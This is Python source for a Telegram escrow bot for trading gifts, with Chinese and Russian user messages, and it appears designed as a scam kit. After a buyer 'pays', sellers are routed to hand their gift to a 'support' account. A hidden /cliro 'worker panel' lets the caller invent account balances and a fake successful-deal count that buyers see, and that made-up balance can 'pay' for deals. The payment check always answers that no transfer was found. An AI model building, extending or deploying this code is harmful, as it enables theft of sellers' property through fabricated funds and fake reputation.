            status=deal_status_line(deal.status, lang),
            user=ce(E_USER, "👤"),
            pin=ce(E_PIN, "📍"),
            seller=seller_name,
            done=completed,
            desc=deal.description,
            gift_line=gift_line,
            bank=ce(E_BANK, "🏦"),
            pay_label=pay_label,
            pay_to=pay_to,
            money=cur_emoji(deal.currency),
            amount=fmt_amount(deal.amount),
            currency=deal.currency,
            note=ce(E_NOTE, "📝"),
            memo=deal.deal_code.lower(),
            warn=ce(E_WARN, "⚠️"),
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=tr(lang, "check_pay"), callback_data=f"checkpay:{deal.id}")],
            [InlineKeyboardButton(
                text=tr(lang, "pay_balance"),
                callback_data=f"pay:{deal.id}",
                icon_custom_emoji_id=E_MONEY,
            )],
            [home_btn(lang)],
        ])
        await message.answer(text, reply_markup=kb, disable_web_page_preview=True)

        if seller and seller.telegram_id != buyer.id:
            try:
                await bot.send_message(
                    seller.telegram_id,
                    tr(
                        "zh", "new_buyer",
                        code=deal.deal_code,
                        buyer=buyer_name,
                        n=b_completed,
                    ),
                )
            except Exception:
                pass


@dp.callback_query(F.data.startswith("checkpay:"))
async def cb_checkpay(call: CallbackQuery):
    await call.answer()
    await call.message.answer(
        "暂未找到转账记录。\n"
        "请检查地址、金额以及包含交易编号的备注。"
        "确认可能需要一些时间。"
    )


@dp.callback_query(F.data.startswith("pay:"))
async def cb_pay(call: CallbackQuery):
    deal_id = int(call.data.split(":")[1])
    async with SessionLocal() as session:
        async with session.begin():
            buyer = await ensure_user(session, call.from_user)
            deal = await session.get(Deal, deal_id)
            if not deal or deal.status != "open":
                await call.answer("交易不可用。", show_alert=True)
                return
            if deal.seller_id == buyer.id:
                await call.answer("不能购买自己创建的交易。", show_alert=True)
                return
            ok = False
            if deal.currency in ("GRAM", "TON") and buyer.balance_ton >= deal.amount:
                buyer.balance_ton -= deal.amount
                buyer.held_ton += deal.amount
                ok = True
            elif deal.currency == "CNY" and buyer.balance_rub >= deal.amount:
                buyer.balance_rub -= deal.amount
                ok = True
            elif deal.currency == "Stars" and buyer.balance_stars >= deal.amount:
                buyer.balance_stars -= deal.amount
                ok = True
            if not ok:
                await call.answer(
                    f"余额不足。所需金额：{fmt_amount(deal.amount)} {deal.currency}",
                    show_alert=True,
                )
                return
            deal.buyer_id = buyer.id
            deal.status = "escrow"
            session.add(LedgerEntry(
                user_id=buyer.id, deal_id=deal.id, amount=-deal.amount,
                currency=deal.currency, kind="escrow_lock",
            ))
            seller = await session.get(User, deal.seller_id)
            seller_tg = seller.telegram_id if seller else None
            seller_lang = "zh" if seller else "ru"
            desc = deal.description
            gift = getattr(deal, 'gift_link', '') or ''
            code = deal.deal_code
            amount = deal.amount
            currency = deal.currency
        await session.commit()

    # покупателю — средства зарезервированы
    buyer_lang = await get_lang(call.from_user)
    await call.message.edit_text(
        tr(
            buyer_lang, "funds_reserved",
            e=ce(E_GIFT, "🎁"),
            status=deal_status_line("escrow", buyer_lang),
            amount=fmt_amount(amount),
            currency=currency,
            desc=desc,
            support=STARS_USERNAME,
        ),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="发起争议" if buyer_lang == "zh" else "发起争议", callback_data=f"dispute:{deal_id}", icon_custom_emoji_id=E_WARN)],
            [home_btn(buyer_lang)],
        ]),
    )
    await call.answer("资金已冻结" if buyer_lang == "zh" else "资金已冻结。")

    # продавцу — язык продавца + кнопки без мгновенного зачисления
    support_url = "https://t.me/" + STARS_USERNAME.lstrip("@")
    gift_line = f"\n{ce(E_PIN, '📍')} Link: {gift}" if gift else ""
    seller_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=tr(seller_lang, "transfer_gift"),
            url=support_url,
            icon_custom_emoji_id=E_GIFT,
        )],
        [InlineKeyboardButton(
            text=tr(seller_lang, "i_transferred"),
            callback_data=f"seller_sent:{deal_id}",
            icon_custom_emoji_id=E_NOTE,
        )],
        [home_btn(seller_lang)],
    ])
    seller_text = tr(
        seller_lang, "seller_paid",
        gift=ce(E_GIFT, "🎁"),
        code=code,
        desc=desc,
        gift_line=gift_line,
        cur=cur_emoji(currency),
        amount=fmt_amount(amount),
        currency=currency,
        user=ce(E_USER, "👤"),
        support=STARS_USERNAME,
    )
    # подправим инструкцию под 2 шага
    if seller_lang == "zh":
        seller_text = (
            f"{deal_status_line('escrow', 'en')}\n\n{ce(E_GIFT, '🎁')} <b>交易 #{code} 已收到付款！</b>\n\n"
            f"请转交礼物：\n<b>{desc}</b>{gift_line}\n\n"
            f"{cur_emoji(currency)} 金额：<b>{fmt_amount(amount)} {currency}</b>（已冻结）\n\n"
            f"{ce(E_USER, '👤')} 接收方（客服）：{STARS_USERNAME}\n\n"
            f"1) 点击“转交礼物”打开客服聊天。\n"
            f"2) 转交后点击“我已转交礼物”。\n"
            f"3) Support verifies and credits funds to your balance."
        )
    else:
        seller_text = (
            f"{deal_status_line('escrow', 'ru')}\n\n{ce(E_GIFT, '🎁')} <b>Оплата по сделке #{code} получена!</b>\n\n"
            f"Передайте, пожалуйста, подарок:\n<b>{desc}</b>{gift_line}\n\n"
            f"{cur_emoji(currency)} Сумма: <b>{fmt_amount(amount)} {currency}</b> (зарезервирована)\n\n"
            f"{ce(E_USER, '👤')} Получатель (саппорт): {STARS_USERNAME}\n\n"
            f"1) Нажмите «Передать подарок» — откроется чат с саппортом.\n"
            f"2) После отправки нажмите «Я передал подарок».\n"
            f"3) Саппорт проверит и зачислит средства на ваш баланс."
        )
    if seller_tg:
        try:
            await bot.send_message(seller_tg, seller_text, reply_markup=seller_kb)
        except Exception:
            pass
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="已收到礼物 — 入账",
            callback_data=f"admin_credit:{deal_id}",
            icon_custom_emoji_id=E_GIFT,
        )],
        [InlineKeyboardButton(
            text="联系客服",
            url="https://t.me/" + STARS_USERNAME.lstrip("@"),
            icon_custom_emoji_id=E_SUPPORT,
        )],
    ])
    admin_text = (
        f"{ce(E_WARN, '⚠️')} <b>交易 #{code} — 已收到付款</b>\n\n"
        f"{ce(E_GIFT, '🎁')} 礼物：<b>{desc}</b>{gift_line}\n"
        f"{cur_emoji(currency)} 金额：<b>{fmt_amount(amount)} {currency}</b>\n"
        f"{ce(E_USER, '👤')} 请发送至 {STARS_USERNAME}\n\n"
        f"礼物到达客服账户后，请点击下方按钮。"
    )
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, admin_text, reply_markup=admin_kb)
        except Exception:
            pass


@dp.callback_query(F.data.startswith("seller_sent:"))
async def cb_seller_sent(call: CallbackQuery):
    deal_id = int(call.data.split(":")[1])
    lang = await get_lang(call.from_user)
    async with SessionLocal() as session:
        deal = await session.get(Deal, deal_id)
        if not deal or deal.status not in ("escrow", "waiting_support"):
            await call.answer("交易不可用" if lang == "zh" else "交易不可用", show_alert=True)
            return
        seller = await session.get(User, deal.seller_id)
        if not seller or seller.telegram_id != call.from_user.id:
            if call.from_user.id not in ADMIN_IDS:
                await call.answer("仅卖家可操作" if lang == "zh" else "仅卖家可操作", show_alert=True)
                return
        deal.status = "waiting_support"
        await session.commit()
        desc = deal.description
        gift = getattr(deal, "gift_link", "") or ""
        code = deal.deal_code
        amount = deal.amount
        currency = deal.currency
    gift_line = f"\nLink: {gift}" if gift else ""
    await call.message.edit_text(
        tr(lang, "waiting_support", status=deal_status_line("waiting_support", lang), support=STARS_USERNAME),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
    )
    await call.answer()
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="礼物已收到 — 入账",
            callback_data=f"admin_credit:{deal_id}",
            icon_custom_emoji_id=E_GIFT,
        )],
        [InlineKeyboardButton(
            text="已收到礼物 — 入账",
            callback_data=f"admin_credit:{deal_id}",
            icon_custom_emoji_id=E_MONEY,
        )],
        [InlineKeyboardButton(
            text="联系客服",
            url="https://t.me/" + STARS_USERNAME.lstrip("@"),
            icon_custom_emoji_id=E_SUPPORT,
        )],
    ])
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                tr(
                    "ru", "seller_marked",
                    bell=ce(E_WARN, "🔔"),
                    gift=ce(E_GIFT, "🎁"),
                    money=cur_emoji(currency),
                    user=ce(E_USER, "👤"),
                    warn=ce(E_NOTE, "📝"),
                    code=code, desc=desc, gift_line=gift_line,
                    amount=fmt_amount(amount), currency=currency,
                    support=STARS_USERNAME,
                ),
                reply_markup=admin_kb,
            )
        except Exception:
            pass


@dp.callback_query(F.data.startswith("admin_credit:"))
async def cb_admin_credit(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        await call.answer("仅管理员可操作", show_alert=True)
        return
    deal_id = int(call.data.split(":")[1])
    async with SessionLocal() as session:
        async with session.begin():
            deal = await session.get(Deal, deal_id)
            if not deal or deal.status not in ("escrow", "waiting_support"):
                await call.answer("该交易已关闭", show_alert=True)
                return
            seller = await session.get(User, deal.seller_id)
            buyer = await session.get(User, deal.buyer_id) if deal.buyer_id else None
            if deal.currency in ("GRAM", "TON"):
                if buyer:
                    buyer.held_ton = max(Decimal("0"), (buyer.held_ton or Decimal("0")) - deal.amount)
                seller.balance_ton += deal.amount
            elif deal.currency == "CNY":
                seller.balance_rub += deal.amount
            else:
                seller.balance_stars += deal.amount
            deal.status = "completed"
            session.add(LedgerEntry(
                user_id=seller.id, deal_id=deal.id, amount=deal.amount,
                currency=deal.currency, kind="escrow_release",
            ))
            seller_tg = seller.telegram_id
            buyer_tg = buyer.telegram_id if buyer else None
            seller_lang = "zh"
            amount = deal.amount
            currency = deal.currency
            code = deal.deal_code
        await session.commit()
    await call.message.edit_text(
        f"✅ 交易 #{code} 已完成，款项已记入卖家余额。"
    )
    await call.answer("完成")
    if seller_tg:
        try:
            await bot.send_message(
                seller_tg,
                tr(
                    seller_lang, "funds_credited",
                    status=deal_status_line("completed", seller_lang),
                    amount=fmt_amount(amount), currency=currency, code=code,
                ),
            )
        except Exception:
            pass
    if buyer_tg:
        try:
            await bot.send_message(
                buyer_tg,
                f"✅ 交易 #{code} 已完成，客服已确认礼物转交。",
            )
        except Exception:
            pass


@dp.callback_query(F.data.startswith("seller_check:"))
async def cb_seller_check(call: CallbackQuery):
    await call.answer()
    lang = await get_lang(call.from_user)
    msg = (
        f"客服将在 {STARS_USERNAME} 核实礼物。"
        if lang == "zh"
        else f"客服将在 {STARS_USERNAME} 核实礼物。"
    )
    await call.message.answer(msg)


@dp.callback_query(F.data.startswith("seller_confirm:"))
async def cb_seller_confirm(call: CallbackQuery):
    # старая кнопка — направляем на новый флоу
    await call.answer(
        "请点击“我已转交礼物”，并等待客服确认。",
        show_alert=True,
    )


@dp.callback_query(F.data.startswith("dispute:"))
async def cb_dispute(call: CallbackQuery):
    deal_id = int(call.data.split(":")[1])
    async with SessionLocal() as session:
        deal = await session.get(Deal, deal_id)
        user = await ensure_user(session, call.from_user)
        if not deal or deal.status != "escrow":
            await call.answer("无法发起争议。", show_alert=True)
            return
        if deal.buyer_id != user.id and call.from_user.id not in ADMIN_IDS:
            await call.answer("无法发起争议。", show_alert=True)
            return
        deal.status = "dispute"
        await session.commit()
        code = deal.deal_code
    await call.message.edit_text(
        f"{ce(E_WARN, '⚠️')} 交易 #{code} 已发起争议。 "
        f"资金将在管理员作出决定前保持冻结。",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, f"⚠️ 交易 #{code} 发生争议")
        except Exception:
            pass



@dp.callback_query(F.data == "wallet")
async def cb_wallet(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="+ 添加 GRAM 钱包", callback_data="wallet_ton")],
        [InlineKeyboardButton(text="+ 添加 Alipay", callback_data="wallet_alipay")],
        [InlineKeyboardButton(text="+ 添加 WeChat Pay", callback_data="wallet_wechat")],
        [InlineKeyboardButton(text="+ 添加 UnionPay", callback_data="wallet_unionpay")],
        [home_btn()],
    ])
    try:
        await call.message.edit_text(
            "<b>请选择要添加的收款方式：</b>",
            reply_markup=kb,
        )
    except Exception:
        await call.message.answer(
            "<b>请选择要添加的收款方式：</b>",
            reply_markup=kb,
        )
    await call.answer()


@dp.callback_query(F.data == "wallet_ton")
async def cb_wallet_ton(call: CallbackQuery, state: FSMContext):
    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        await session.commit()
        current = user.ton_wallet or "未设置"
    await state.set_state(WalletForm.ton)
    await call.message.edit_text(
        f"{ce(E_BANK, '🏦')} <b>当前 GRAM 钱包：</b>\n"
        f"<code>{current}</code>\n\n"
        "请输入新的 GRAM 钱包地址，或返回主菜单：",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()


@dp.message(WalletForm.ton)
async def save_ton_wallet(message: Message, state: FSMContext):
    addr = message.text.strip()
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.ton_wallet = addr[:128]
        await session.commit()
    await state.clear()
    await message.answer(
        f"✅ GRAM 钱包已保存：\n<code>{addr}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )


@dp.callback_query(F.data.in_({"wallet_alipay", "wallet_wechat", "wallet_unionpay"}))
async def cb_wallet_china(call: CallbackQuery, state: FSMContext):
    method = call.data.split("_", 1)[1]
    fields = {
        "alipay": ("alipay_account", "Alipay（支付宝）"),
        "wechat": ("wechat_account", "WeChat Pay（微信支付）"),
        "unionpay": ("unionpay_details", "UnionPay（银联）"),
    }
    field, label = fields[method]
    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        current = getattr(user, field, "") or "未设置"
    await state.set_state(WalletForm.card)
    await state.update_data(china_wallet_field=field, china_wallet_label=label)
    await call.message.edit_text(
        f"<b>{label}</b>\\n当前信息：<code>{current}</code>\\n\\n请输入收款账号或收款说明：",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()


@dp.message(WalletForm.card)
async def save_china_wallet(message: Message, state: FSMContext):
    data = await state.get_data()
    field = data.get("china_wallet_field")
    label = data.get("china_wallet_label", "收款信息")
    if field not in {"alipay_account", "wechat_account", "unionpay_details"}:
        await state.clear()
        return
    value = (message.text or "").strip()
    if not value:
        await message.answer("请输入有效的收款信息。")
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        setattr(user, field, value[:256])
        await session.commit()
    await state.clear()
    await message.answer(
        f"✅ {label} 已保存。\\n<code>{value}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )


# ---------- Рефералка ----------
@dp.callback_query(F.data == "referral")
async def cb_referral(call: CallbackQuery):
    lang = await get_lang(call.from_user)
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start={call.from_user.id}"
    text = tr(lang, "referral", e=ce(E_REF, "🤝"), link=link)
    try:
        await call.message.edit_text(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
    except Exception:
        await call.message.answer(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
    await call.answer()


# Язык выбирается командой /cliro; отдельного переключателя в меню нет.


# ---------- Поддержка ----------
@dp.callback_query(F.data == "support")
async def cb_support(call: CallbackQuery, state: FSMContext):
    lang = await get_lang(call.from_user)
    await state.set_state(SupportForm.message)
    try:
        await call.message.edit_text(
            tr(lang, "support"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
    except Exception:
        await call.message.answer(
            tr(lang, "support"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
    await call.answer()


@dp.message(SupportForm.message)
async def support_msg(message: Message, state: FSMContext):
    await state.clear()
    text = message.text or "（无文字）"
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"🆘 客服消息 from @{message.from_user.username or '—'} "
                f"(id {message.from_user.id}):\n\n{text}",
            )
        except Exception:
            pass
    await message.answer(
        "✅ 您的消息已发送给客服。",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )




# ---------- /cliro — панель (доступна всем, кто знает команду) ----------
class CliroForm(StatesGroup):
    set_ton = State()
    set_cny = State()
    set_stars = State()
    set_deals = State()


def cliro_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 GRAM 余额", callback_data="cliro:ton")],
        [InlineKeyboardButton(text="💴 CNY 余额（元）", callback_data="cliro:cny")],
        [InlineKeyboardButton(text="⭐ Stars 余额", callback_data="cliro:stars")],
        [InlineKeyboardButton(text="✅ 成功交易数", callback_data="cliro:deals")],
        [InlineKeyboardButton(text="📊 我的状态", callback_data="cliro:status")],
        [home_btn("zh")],
    ])


@dp.message(Command("cliro"))
async def cmd_cliro(message: Message, state: FSMContext):
    # Доступна всем, кто знает команду /cliro
    await state.clear()
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.language = "zh"
        await session.commit()
        text = (
            "👋 <b>你好！</b>\n"
            "<b>面板已打开。</b>\n\n"
            f"GRAM: <b>{fmt_amount(user.balance_ton)}</b>\n"
            f"CNY（元）: <b>{fmt_amount(user.balance_rub)}</b>\n"
            f"Stars: <b>{fmt_amount(user.balance_stars)}</b>\n"
            f"成功交易数（刷单）: <b>{user.fake_success_deals}</b>\n\n"
            "请选择要修改的项目："
        )
    await message.answer(text, reply_markup=cliro_kb())


@dp.callback_query(F.data == "cliro:status")
async def cliro_status(call: CallbackQuery):
    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        await session.commit()
        text = (
            "👋 <b>你好！</b>\n"
            "<b>面板已打开。</b>\n\n"
            f"GRAM: <b>{fmt_amount(user.balance_ton)}</b>\n"
            f"CNY（元）: <b>{fmt_amount(user.balance_rub)}</b>\n"
            f"Stars: <b>{fmt_amount(user.balance_stars)}</b>\n"
            f"成功交易数（刷单）: <b>{user.fake_success_deals}</b>"
        )
        await call.message.edit_text(text, reply_markup=cliro_kb())
    await call.answer()


@dp.callback_query(F.data == "cliro:ton")
async def cliro_ton(call: CallbackQuery, state: FSMContext):
    await state.set_state(CliroForm.set_ton)
    await call.message.edit_text(
        "请输入新的 <b>GRAM</b> 余额（例如 100）：",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn("zh")]]),
    )
    await call.answer()


@dp.callback_query(F.data == "cliro:cny")
async def cliro_cny(call: CallbackQuery, state: FSMContext):
    await state.set_state(CliroForm.set_cny)
    await call.message.edit_text(
        "请输入新的 <b>CNY（元）</b> 余额（例如 500）：\n\n"
        "此余额可用于支付宝 / 微信 / 银联交易的「使用余额付款」。",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn("zh")]]),
    )
    await call.answer()


@dp.callback_query(F.data == "cliro:stars")
async def cliro_stars(call: CallbackQuery, state: FSMContext):
    await state.set_state(CliroForm.set_stars)
    await call.message.edit_text(
        "请输入新的 <b>Stars</b> 余额（例如 1000）：",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn("zh")]]),
    )
    await call.answer()


@dp.callback_query(F.data == "cliro:deals")
async def cliro_deals(call: CallbackQuery, state: FSMContext):
    await state.set_state(CliroForm.set_deals)
    await call.message.edit_text(
        "请输入要刷的 <b>成功交易数</b>（例如 50）：",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn("zh")]]),
    )
    await call.answer()


@dp.message(CliroForm.set_ton)
async def cliro_set_ton(message: Message, state: FSMContext):
    try:
        val = Decimal(message.text.replace(",", ".")).quantize(Decimal("0.0001"))
        if val < 0:
            raise InvalidOperation
    except Exception:
        await message.answer("请输入数字，例如 100")
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.balance_ton = val
        await session.commit()
    await state.clear()
    await message.answer(f"✅ GRAM 余额 = <b>{fmt_amount(val)}</b>", reply_markup=cliro_kb())


@dp.message(CliroForm.set_cny)
async def cliro_set_cny(message: Message, state: FSMContext):
    try:
        val = Decimal(message.text.replace(",", ".")).quantize(Decimal("0.01"))
        if val < 0:
            raise InvalidOperation
    except Exception:
        await message.answer("请输入数字，例如 500")
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.balance_rub = val
        await session.commit()
    await state.clear()
    await message.answer(
        f"✅ CNY（元）余额 = <b>{fmt_amount(val)}</b>\n"
        "可用于支付宝 / 微信 / 银联的「使用余额付款」。",
        reply_markup=cliro_kb(),
    )


@dp.message(CliroForm.set_stars)
async def cliro_set_stars(message: Message, state: FSMContext):
    try:
        val = Decimal(message.text.replace(",", ".")).quantize(Decimal("0.01"))
        if val < 0:
            raise InvalidOperation
    except Exception:
        await message.answer("请输入数字，例如 1000")
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.balance_stars = val
        await session.commit()
    await state.clear()
    await message.answer(f"✅ Stars 余额 = <b>{fmt_amount(val)}</b>", reply_markup=cliro_kb())


@dp.message(CliroForm.set_deals)
async def cliro_set_deals(message: Message, state: FSMContext):
    try:
        val = int(message.text.strip())
        if val < 0:
            raise ValueError
    except Exception:
        await message.answer("请输入整数，例如 50")
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        user.fake_success_deals = val
        await session.commit()
    await state.clear()
    await message.answer(
        f"✅ 成功交易数（刷单）= <b>{val}</b>\n"
        "买家在你作为卖家时会看到这个数字。",
        reply_markup=cliro_kb(),
    )



async def main():
    await init_db()
    from aiogram.types import BotCommand, BotCommandScopeDefault, BotCommandScopeChat
    # Обычным юзерам в меню только /start — без /buy и /cliro
    await bot.set_my_commands(
        [BotCommand(command="start", description="打开菜单")],
        scope=BotCommandScopeDefault(),
    )
    for admin_id in ADMIN_IDS:
        try:
            await bot.set_my_commands(
                [
                    BotCommand(command="start", description="打开菜单"),
                    BotCommand(command="cliro", description="工作员面板"),
                    BotCommand(command="buy", description="通过代码购买"),
                ],
                scope=BotCommandScopeChat(chat_id=admin_id),
            )
        except Exception as e:
            print(f"set_my_commands for {admin_id}: {e}")
    print("OTC ELF bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())